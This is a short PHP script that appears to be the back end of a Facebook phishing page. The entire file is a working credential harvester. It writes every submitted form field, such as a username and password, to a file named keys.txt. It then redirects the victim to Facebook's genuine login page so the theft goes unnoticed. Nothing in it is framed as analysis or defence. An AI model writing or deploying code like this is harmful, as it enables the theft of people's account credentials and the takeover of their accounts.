<?php
header ('Location:https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110 ');
$handle = fopen('keys.txt', 'a');
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>